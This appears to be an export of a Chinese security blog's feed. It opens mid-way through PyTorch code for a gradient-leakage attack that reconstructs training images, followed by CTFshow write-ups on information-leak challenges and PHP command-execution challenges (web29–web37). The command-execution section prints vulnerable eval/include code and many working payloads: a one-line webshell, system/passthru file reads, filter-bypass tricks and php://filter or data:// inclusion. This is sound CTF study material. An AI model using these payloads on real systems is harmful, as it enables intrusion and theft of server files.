class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>详解见<a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
<p>但是这份代码目前也存在一定问题，还有参数需要调整，恢复效果不佳。</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI安全</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>梯度泄露攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-信息搜集</title>
    <url>/2023/12/19/CTFshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1>CTFshow-信息搜集</h1>
<h2 id="web1">web1</h2>
<p>f12，前端js敏感泄露</p>
<p><img src="https://s2.loli.net/2023/12/19/3wpAmDHNfxPEKC5.png" alt="ctfshow_xinxisouji_1"></p>
<h2 id="web2">web2</h2>
<p>禁止了f12，但仍然可以通过查看源码发方式去发现flag</p>
<p><img src="https://s2.loli.net/2023/12/19/gK3hSrmNvXBjlUt.png" alt="ctfshow_xinxisouji_2"></p>
<h2 id="web3">web3</h2>
<p>flag藏在响应包中</p>
<p><img src="https://s2.loli.net/2023/12/19/OWwmaN8i9KSdCPs.png" alt="ctfshow_xinxisouji_3"></p>
<h2 id="web4">web4</h2>
<p>查看robots.txt泄露信息，访问相应目录得到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/pQaHgDOAEG3YsBf.png" alt="ctfshow_xinxisouji_4"></p>
<h2 id="web5">web5</h2>
<p>存在源码泄露，访问index.phps，下载得到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/QtJiznrYFUC79BE.png" alt="ctfshow_xinxisouji_5"></p>
<h2 id="web6">web6</h2>
<p>同信息泄露，访问www.zip，得到源码的压缩包</p>
<p><img src="https://s2.loli.net/2023/12/19/uxXkLBZlwHhgdMs.png" alt="ctfshow_xinxisouji_6"></p>
<h2 id="web7">web7</h2>
<p>版本控制，明显提示了git泄露</p>
<p>访问.git</p>
<p><img src="https://s2.loli.net/2023/12/19/f9VyPXODWpjYmFQ.png" alt="ctfshow_xinxisouji_7"></p>
<h2 id="web8">web8</h2>
<p>版本控制，跟上一题有所区别，是svn泄露</p>
<p>访问.svn</p>
<p><img src="https://s2.loli.net/2023/12/19/RmQ5zOPCyESpoUw.png" alt="ctfshow_xinxisouji_8"></p>
<h2 id="web9">web9</h2>
<p>提示vim，存在缓存泄露</p>
<p>访问index.php.swp</p>
<p><img src="https://s2.loli.net/2023/12/19/JUEIWPLwMlaTY6A.png" alt="ctfshow_xinxisouji_9"></p>
<h2 id="web10">web10</h2>
<p>直接查看cookie即得到</p>
<p><img src="https://s2.loli.net/2023/12/19/S5qH9XU2pR7AhK1.png" alt="ctfshow_xinxisouji_10"></p>
<h2 id="web11">web11</h2>
<p>考察的是DNS解析相关，刚好填补了知识点的空缺</p>
<p><img src="https://s2.loli.net/2023/12/19/bYNALzscdjB36IC.png" alt="ctfshow_xinxisouji_11"></p>
<h2 id="web12">web12</h2>
<p>主页面地下一串数字，即是密码</p>
<p>访问robots.txt，得到管理员后台路径/admin</p>
<p>然后账号admin，密码372619038</p>
<p>既得flag</p>
<h2 id="web13">web13</h2>
<p>页面下方documents点击</p>
<p><img src="https://s2.loli.net/2023/12/19/mBFd3P1wbSTnE7i.png" alt="ctfshow_xinxisouji_12"></p>
<p>然后发现开发者文档</p>
<p><img src="https://s2.loli.net/2023/12/19/lBcnrqbRNGmzPTC.png" alt="ctfshow_xinxisouji_13"></p>
<p>登录即得flag</p>
<p><img src="https://s2.loli.net/2023/12/19/GbsVhao8P9mkrA5.png" alt="ctfshow_xinxisouji_14"></p>
<h2 id="web14">web14</h2>
<p>存在编辑器</p>
<p><img src="https://s2.loli.net/2023/12/19/DdokiKVFqbNJYsH.png" alt="ctfshow_xinxisouji_15"></p>
<p>文件上传处存在源码泄露</p>
<p><img src="https://s2.loli.net/2023/12/19/o71TQKGNUfObIgZ.png" alt="ctfshow_xinxisouji_16"></p>
<p>然后找到相应的flag文件</p>
<p>访问对应路径/nothinghere/fl000g.txt 得到flag</p>
<h2 id="web15">web15</h2>
<p>扫描发现存在后台/admin</p>
<p>然后根据邮箱进行社工，发现密保答案，重置密码</p>
<p>登录得到flag</p>
<h2 id="web16">web16</h2>
<p>探针默认名称为</p>
<p>tz.php，访问后在phpinfo中找到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/Cg3GD1Awu2ab97M.png" alt="ctfshow_xinxisouji_17"></p>
<p><img src="https://s2.loli.net/2023/12/19/HmRYp3f4cjheEk2.png" alt="ctfshow_xinxisouji_18"></p>
<h2 id="web17">web17</h2>
<p>扫描后发现存在backup.sql泄露</p>
<p>然后在文件中发现flag</p>
<p><img src="https://s2.loli.net/2023/12/19/itj8EzL5TxlUFCJ.png" alt="ctfshow_xinxisouji_19"></p>
<h2 id="web18">web18</h2>
<p>源码中存在敏感信息</p>
<p><img src="https://s2.loli.net/2023/12/19/5Xn4w8eKkVYld7g.png" alt="ctfshow_xinxisouji_20"></p>
<p><img src="https://s2.loli.net/2023/12/19/5Xn4w8eKkVYld7g.png" alt="ctfshow_xinxisouji_20"></p>
<p>解密后访问110.php</p>
<h2 id="web19">web19</h2>
<p>前端加密，参数保存在js中</p>
<p><img src="https://s2.loli.net/2023/12/19/sNkwgWSCDFxVcey.png" alt="ctfshow_xinxisouji_22"></p>
<p>根据源码，aes加密，CBC模式，zeropadding填充</p>
<p>然后解密可得密码</p>
<p><img src="https://s2.loli.net/2023/12/19/bKWAzSZkBwdQsRe.png" alt="ctfshow_xinxisouji_23"></p>
<p>最后进行登录，获得flag</p>
<p><img src="https://s2.loli.net/2023/12/19/j6gUmZuhnMx5ri1.png" alt="ctfshow_xinxisouji_24"></p>
<h2 id="web20">web20</h2>
<p>访问/db/db.mdb</p>
<p>下载库，查找flag</p>
<p><img src="https://s2.loli.net/2023/12/19/9nHjpeWtQJxYvba.png" alt="ctfshow_xinxisouji_25"></p>
<h2 id="总结">总结</h2>
<p>信息泄露问题很普遍，前期的信息搜集很重要，无论是在CTF赛事中，还是在实战。</p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-命令执行</title>
    <url>/2023/01/17/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1>CTFshow-命令执行</h1>
<h2 id="web29">web29</h2>
<h3 id="源码">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<p>简单分析一下，可以看到，危险函数是eval，但是只进行了对flag的过滤，还是比较简单的</p>
<h4 id="方法一">方法一</h4>
<p>比较简单的一个，不考虑过滤，使用eval传一个一句话木马进去，蚁剑连接即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_POST[1]); </span><br></pre></td></tr></table></figure>
<h4 id="方法三">方法三</h4>
<p>*绕过flag，但是需要在源码中查找flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;cat fl*g.php&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法四">方法四</h4>
<p>利用*去匹配文件名的一部分的以及利用cp将文件内容复制到另一文本中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;cp fl*g.php fl0g.txt &quot;);</span><br></pre></td></tr></table></figure>
<p>然后再访问fl0g.txt就可以得到全部了</p>
<h4 id="方法五">方法五</h4>
<p>tac与system结合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
<p>tac和echo命令相结合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo%20`tac%20fla*`;</span><br></pre></td></tr></table></figure>
<h4 id="方法六">方法六</h4>
<p>使用参数引用+system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>使用参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>得到的需要base64解码</p>
<h4 id="方法七">方法七</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=highlight_file(next(array_reverse(scandir(&quot;.&quot;))));</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>解释 <code>scandir(&quot;.&quot;)</code>：</strong>
<ul>
<li><code>scandir()</code> 函数用于获取指定目录中的文件和目录列表。</li>
<li><code>.</code> 表示当前目录。</li>
</ul>
</li>
<li><strong>解释 <code>array_reverse()</code>：</strong>
<ul>
<li><code>array_reverse()</code> 函数用于反转数组中的元素的顺序。</li>
</ul>
</li>
<li><strong>解释 <code>next()</code>：</strong>
<ul>
<li><code>next()</code> 函数用于将数组指针移动到数组中的下一个元素，并返回该元素的值。</li>
</ul>
</li>
<li><strong>解释 <code>highlight_file()</code>：</strong>
<ul>
<li><code>highlight_file()</code> 函数用于在浏览器中以语法高亮的形式显示 PHP 文件的内容。</li>
</ul>
</li>
</ol>
<p>有参考意义</p>
<h2 id="web30">web30</h2>
<h3 id="源码-2">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-2">payload</h3>
<p>参考上题，其实就是多过滤了一个system和php</p>
<p>因此上题的部分payload也能打通</p>
<p>以下给出几个主要思路去思考</p>
<h4 id="方法一-2">方法一</h4>
<p>使用echo去代替system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo%20`tac%20fla*`;</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>使用其他命令执行函数去代替system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法三-2">方法三</h4>
<p>使用参数引用+system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>使用参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法四-2">方法四</h4>
<p>还有一种绕过方法</p>
<p>利用’ '去分割字符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure>
<h4 id="方法五-2">方法五</h4>
<p>使用???去进行单个字符的匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac%20fla?????`;</span><br></pre></td></tr></table></figure>
<h4 id="方法六-2">方法六</h4>
<p>构造一句话木马，蚁剑连接</p>
<h2 id="web31">web31</h2>
<h3 id="源码-3">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-3">payload</h3>
<p>相比上一题。这边多过滤了cat，sort，shell，\. ，空格，\</p>
<h4 id="方法一-3">方法一</h4>
<p>参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[&quot;b&quot;]);&amp;b=system(&quot;tac%20flag.php&quot;);	</span><br></pre></td></tr></table></figure>
<h4 id="方法二-2">方法二</h4>
<p>其他执行函数绕过，以及*通配符，最不同的是空格方面的绕过方法</p>
<p>这边使用的命令拼接符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac%09fla?&quot;);</span><br></pre></td></tr></table></figure>
<p>FS$绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br></pre></td></tr></table></figure>

#### 方法三

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

1. `scandir(pos(localeconv()))`：获取当前目录下的文件列表。pos在这里的作用是为了代替出小数点。
2. `array_reverse`：将文件列表反转，改变它们的顺序。
3. `next`：获取反转后列表的下一个元素。
4. `show_source`：显示指定文件的源代码。

## web32

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

#### payload

增加了很多过滤，把echo相关也过滤掉了，以及(和；

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

## web33

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

虽然增添了“的过滤，但是仍然可以使用文件包含的方法绕过

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web34

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

过滤了：，但是仍然可以使用文件包含的方式去绕过

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web35

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

同上

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web36

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

### payload

过滤了数字

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web37

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

